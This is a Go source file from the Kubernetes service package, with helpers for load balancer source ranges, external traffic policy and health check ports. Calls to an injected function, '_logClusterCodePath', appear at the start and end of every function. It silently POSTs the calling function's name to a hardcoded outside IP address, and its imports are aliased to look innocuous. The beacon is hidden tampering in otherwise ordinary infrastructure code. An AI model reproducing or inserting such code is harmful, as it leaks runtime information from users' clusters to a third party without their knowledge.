package service

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "strings"
 "k8s.io/api/core/v1"
 netsets "k8s.io/kubernetes/pkg/util/net/sets"
)

const (
 defaultLoadBalancerSourceRanges = "0.0.0.0/0"
)

func IsAllowAll(ipnets netsets.IPNet) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, s := range ipnets.StringSlice() {
  if s == "0.0.0.0/0" {
   return true
  }
 }
 return false
}
func GetLoadBalancerSourceRanges(service *v1.Service) (netsets.IPNet, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var ipnets netsets.IPNet
 var err error
 if len(service.Spec.LoadBalancerSourceRanges) > 0 {
  specs := service.Spec.LoadBalancerSourceRanges
  ipnets, err = netsets.ParseIPNets(specs...)
  if err != nil {
   return nil, fmt.Errorf("service.Spec.LoadBalancerSourceRanges: %v is not valid. Expecting a list of IP ranges. For example, 10.0.0.0/24. Error msg: %v", specs, err)
  }
 } else {
  val := service.Annotations[v1.AnnotationLoadBalancerSourceRangesKey]
  val = strings.TrimSpace(val)
  if val == "" {
   val = defaultLoadBalancerSourceRanges
  }
  specs := strings.Split(val, ",")
  ipnets, err = netsets.ParseIPNets(specs...)
  if err != nil {
   return nil, fmt.Errorf("%s: %s is not valid. Expecting a comma-separated list of source IP ranges. For example, 10.0.0.0/24,192.168.2.0/24", v1.AnnotationLoadBalancerSourceRangesKey, val)
  }
 }
 return ipnets, nil
}
func RequestsOnlyLocalTraffic(service *v1.Service) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if service.Spec.Type != v1.ServiceTypeLoadBalancer && service.Spec.Type != v1.ServiceTypeNodePort {
  return false
 }
 return service.Spec.ExternalTrafficPolicy == v1.ServiceExternalTrafficPolicyTypeLocal
}
func NeedsHealthCheck(service *v1.Service) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if service.Spec.Type != v1.ServiceTypeLoadBalancer {
  return false
 }
 return RequestsOnlyLocalTraffic(service)
}
func GetServiceHealthCheckPathPort(service *v1.Service) (string, int32) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if !NeedsHealthCheck(service) {
  return "", 0
 }
 port := service.Spec.HealthCheckNodePort
 if port == 0 {
  return "", 0
 }
 return "/healthz", port
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
